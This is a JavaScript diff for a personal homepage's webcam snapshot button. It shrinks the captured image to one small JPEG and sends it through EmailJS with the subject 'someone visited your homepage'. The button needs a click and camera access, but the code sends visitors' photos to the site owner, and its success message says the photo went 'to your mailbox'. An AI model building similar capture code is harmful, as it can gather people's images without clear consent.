@@ -1841,15 +1841,17 @@
     function toggleCameraMin() {
         cameraWin.classList.toggle('minimized');
     }
-
-    // --- 拍照并发送双份邮件 (高清+缩略) ---
-    // 只有当 snapBtn 存在时才绑定事件
+    // --- 修改后：只发送一张极小的缩略图 (确保发送成功) ---
     const snapBtn = document.getElementById('snapBtn');
     if (snapBtn) {
         snapBtn.addEventListener('click', function() {
             const video = document.getElementById('camera-feed');
-            if (!video.srcObject) { alert("请先开启摄像头！"); return; }
             
+            if (!video.srcObject) {
+                alert("请先开启摄像头！");
+                return;
+            }
+
             const btn = this;
             if (btn.style.backgroundColor === 'orange') return; // 防止连点
 
@@ -1860,61 +1862,48 @@
                 setTimeout(() => flash.classList.remove('flash-active'), 500);
             }
 
-            // 2. 按钮变色提示
+            // 2. 按钮变色提示正在发送
             btn.style.backgroundColor = 'orange';
 
-            // 3. 准备数据
+            // 3. 准备极小缩略图 (320px 宽，体积仅几KB)
+            const canvasSmall = document.createElement('canvas');
+            const ratio = video.videoHeight / video.videoWidth;
+            
+            canvasSmall.width = 320; 
+            canvasSmall.height = 320 * ratio;
+            
+            const ctxSmall = canvasSmall.getContext('2d');
+            ctxSmall.drawImage(video, 0, 0, canvasSmall.width, canvasSmall.height);
+            
+            // 使用 0.3 的低质量 JPEG，生成超短字符串
+            const base64Img = canvasSmall.toDataURL('image/jpeg', 0.3);
+
+            // 4. 准备时间
             const now = new Date();
             const timeStr = `${now.getMonth()+1}-${now.getDate()} ${now.getHours()}:${now.getMinutes()}:${now.getSeconds()}`;
 
-            // --- A. 准备高清图 (JPEG 0.95) ---
-            const canvasHD = document.createElement('canvas');
-            canvasHD.width = video.videoWidth;
-            canvasHD.height = video.videoHeight;
-            const ctxHD = canvasHD.getContext('2d');
-            ctxHD.drawImage(video, 0, 0, canvasHD.width, canvasHD.height);
-            const base64HD = canvasHD.toDataURL('image/jpeg', 0.95);
-
-            // --- B. 准备缩略图 (JPEG 0.5, 宽480px) ---
-            const canvasSmall = document.createElement('canvas');
-            const ratio = video.videoHeight / video.videoWidth;
-            canvasSmall.width = 480; 
-            canvasSmall.height = 480 * ratio;
-            const ctxSmall = canvasSmall.getContext('2d');
-            ctxSmall.drawImage(video, 0, 0, canvasSmall.width, canvasSmall.height);
-            const base64Small = canvasSmall.toDataURL('image/jpeg', 0.5);
-
-            // --- C. 配置发送参数 ---
-            // ★★★ 这里填你的 Template ID (例如 template_xxxxx) ★★★
-            const templateID = 'template_zmous0r'; 
-            
-            // 我从你的截图里读到了这个 Service ID
+            // 5. 配置发送参数
             const serviceID = 'service_fkpoynu'; 
+            const templateID = 'template_zmous0r';
 
-            const paramsHD = {
-                name: "Shadow主页",
-                message: `<h3>[HD 高清原图]</h3> <p>时间: ${timeStr}</p> <br/> <img src="${base64HD}" style="width:100%;" />`
-            };
-            
-            const paramsSmall = {
-                name: "Shadow主页",
-                message: `<h3>[缩略图预览]</h3> <p>时间: ${timeStr}</p> <br/> <img src="${base64Small}" />`
+            const templateParams = {
+                title: "有人访问了你的主页", // 邮件标题
+                name: "访客拍照",           // 发件人名字
+                message: `<h3>[访客缩略图]</h3> <p>时间: ${timeStr}</p> <br/> <img src="${base64Img}" />`
             };
 
-            // --- D. 并发发送 ---
-            console.log("正在发送两封邮件...");
-            Promise.all([
-                emailjs.send(serviceID, templateID, paramsHD),
-                emailjs.send(serviceID, templateID, paramsSmall)
-            ])
-            .then(() => {
+            // 6. 发送邮件
+            console.log("正在发送缩略图...");
+            emailjs.send(serviceID, templateID, templateParams)
+            .then(function(response) {
+                console.log('SUCCESS!', response.status, response.text);
                 btn.style.backgroundColor = '#52c41a'; // 成功变绿
+                alert("成功！照片已发送到你的邮箱。"); 
                 setTimeout(() => btn.style.backgroundColor = '', 2000);
-            })
-            .catch((err) => {
-                console.error("发送失败:", err);
+            }, function(error) {
+                console.error('FAILED...', error);
                 btn.style.backgroundColor = 'red'; // 失败变红
-                alert("发送失败，请检查 Template ID 和 Public Key 是否填对。");
+                alert("发送失败，请检查控制台(F12)错误信息");
                 setTimeout(() => btn.style.backgroundColor = '', 2000);
             });
         });
